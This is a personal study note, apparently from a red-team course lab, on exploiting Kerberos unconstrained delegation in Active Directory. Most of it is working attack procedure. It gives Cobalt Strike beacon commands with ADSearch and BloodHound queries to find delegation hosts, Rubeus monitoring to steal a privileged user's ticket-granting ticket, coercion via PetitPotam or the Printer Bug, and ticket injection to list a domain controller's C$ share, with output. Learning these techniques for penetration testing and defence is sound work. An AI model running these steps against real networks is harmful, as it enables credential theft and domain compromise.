---
creation date: September 24th 2022
last modified date: September 24th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Unconstrained Delegation]]  
___

## Description:  

Delegation allows a user or a service to act on behalf of another user to another service.

If we can compromise a machine with unconstrained delegation, we can extract any TGTs from its memory and use them to impersonate the users against other services in the domain.

In CobaltStrike:

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
```

In Bloodhound:

```
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

Look for machines we have compromised.

If we compromise SRV-1 and wait or engineer a privileged user to interact with it, we can steal their cached TGT. Interaction can be any Kerberos service, so something as simple as `dir \\srv-1\c$` is enough.

Rubeus has a `monitor` command (requires elevation) that will continuously look for and extract new TGTs. On SRV-1:

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:nlamb /interval:10

[*] Action: TGT Monitoring
[*] Target user     : nlamb
[*] Monitoring every 10 seconds for new TGTs

```

You can wait for authentication or force is with [[PetitPotam]] or [[Printer Bug]]

Write the base64 decoded string to a `.kirbi` file on your attacking machine. Create a sacrificial logon session, pass the TGT into it and access the domain controller.

```
beacon> make_token DEV\nlamb FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\nlamb.kirbi
beacon> ls \\dc-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/23/2021 16:49:25   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/21/2021 11:20:15   Shares
          dir     02/19/2021 11:39:02   System Volume Information
          dir     02/17/2021 18:50:37   Users
          dir     02/19/2021 13:26:27   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 512mb    fil     03/09/2021 10:26:16   pagefile.sys
```





To stop Rubeus, use Cobalt Strike `jobs` and `jobkill` commands.

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 24th 2022 (12:42 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
